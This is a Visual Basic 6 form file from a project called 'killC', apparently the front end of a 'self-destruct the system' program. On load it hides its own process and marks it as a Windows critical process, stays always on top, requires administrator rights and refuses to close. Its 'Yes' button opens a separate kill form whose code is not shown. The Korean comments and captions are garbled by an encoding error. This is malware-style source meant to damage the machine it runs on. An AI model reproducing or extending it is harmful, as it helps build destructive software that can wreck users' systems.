VERSION 5.00
Begin VB.Form Frm_Main 
   BackColor       =   &H80000005&
   BorderStyle     =   4  '���� ���� â
   Caption         =   "�����Ԭ�Ѭެެ� �լ֬���ެѬ�ڬ�"
   ClientHeight    =   1605
   ClientLeft      =   45
   ClientTop       =   390
   ClientWidth     =   5910
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1605
   ScaleWidth      =   5910
   ShowInTaskbar   =   0   'False
   StartUpPosition =   1  '������ ���
   Begin killC.UserControl_CandyButton UserControl_CandyButton1 
      Height          =   375
      Left            =   3120
      TabIndex        =   2
      Top             =   1080
      Width           =   2415
      _extentx        =   4260
      _extenty        =   661
      font            =   "Frm_Main.frx":0000
      caption         =   "Exit"
      captionhighlitecolor=   0
      iconhighlitecolor=   0
      style           =   3
      checked         =   0
      colorbuttonhover=   16760976
      colorbuttonup   =   15309136
      colorbuttondown =   15309136
      colorbright     =   16772528
      borderbrightness=   0
      displayhand     =   0
      colorscheme     =   0
   End
   Begin killC.UserControl_CandyButton UserControl_CandyButton 
      Height          =   375
      Left            =   240
      TabIndex        =   0
      Top             =   1080
      Width           =   2415
      _extentx        =   4260
      _extenty        =   661
      font            =   "Frm_Main.frx":0028
      caption         =   "Yes"
      captionhighlitecolor=   0
      iconhighlitecolor=   0
      style           =   3
      checked         =   0
      colorbuttonhover=   8421631
      colorbuttonup   =   192
      colorbuttondown =   192
      colorbright     =   8421631
      borderbrightness=   0
      displayhand     =   0
      colorscheme     =   0
   End
   Begin VB.Label Label2 
      BackStyle       =   0  '����
      Caption         =   "Warning : You cannot cancel it when you start self-destructing."
      BeginProperty Font 
         Name            =   "����"
         Size            =   6.75
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   135
      Left            =   480
      TabIndex        =   3
      Top             =   720
      Width           =   4935
   End
   Begin VB.Label Label1 
      BackStyle       =   0  '����
      Caption         =   "Do you self-destruct the system?"
      BeginProperty Font 
         Name            =   "����"
         Size            =   14.25
         Charset         =   129
         Weight          =   700
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   600
      TabIndex        =   1
      Top             =   240
      Width           =   4695
   End
End
Attribute VB_Name = "Frm_Main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit '���� ���� ���� ����
Private Declare Function IsUserAnAdmin Lib "Shell32" () As Long '������ ���� �˻� ����
Private Declare Function MessageBeep Lib "user32" (ByVal wType As Long) As Long '������ ���� ����

Private Sub Form_Load()
   On Error GoTo Form_Load_Error

   AlwaysTop Frm_Main, True '�� �ֻ���
   ProtectProcess 'ũ��Ƽ�� ���μ��� ���
   HideMyProcess '���μ��� ���� ����
   
   If IsUserAnAdmin = 1 Then '������ ���� ���� Ȯ��
   MessageBeep (30)
   Else
   Call MsgBox("Run the program as an administrator.", vbCritical, "Error!")
   RestoreProcess ' ũ��Ƽ�� ���μ��� ����
   End
   End If

   On Error GoTo 0
   Exit Sub

Form_Load_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure Form_Load of Form Frm_Main"
End Sub

Private Sub Form_Unload(Cancel As Integer)
   On Error GoTo Form_Unload_Error

Cancel = 1

   On Error GoTo 0
   Exit Sub

Form_Unload_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure Form_Unload of Form Frm_Main"
End Sub

Private Sub UserControl_CandyButton_Click()
   On Error GoTo UserControl_CandyButton_Click_Error

Me.Hide
Frm_Kill.Show

   On Error GoTo 0
   Exit Sub

UserControl_CandyButton_Click_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure UserControl_CandyButton_Click of Form Frm_Main"
End Sub

Private Sub UserControl_CandyButton1_Click()
   On Error GoTo UserControl_CandyButton1_Click_Error

RestoreProcess ' ũ��Ƽ�� ���μ��� ����
End

   On Error GoTo 0
   Exit Sub

UserControl_CandyButton1_Click_Error:

    MsgBox "Error " & Err.Number & " (" & Err.Description & ") in procedure UserControl_CandyButton1_Click of Form Frm_Main"
End Sub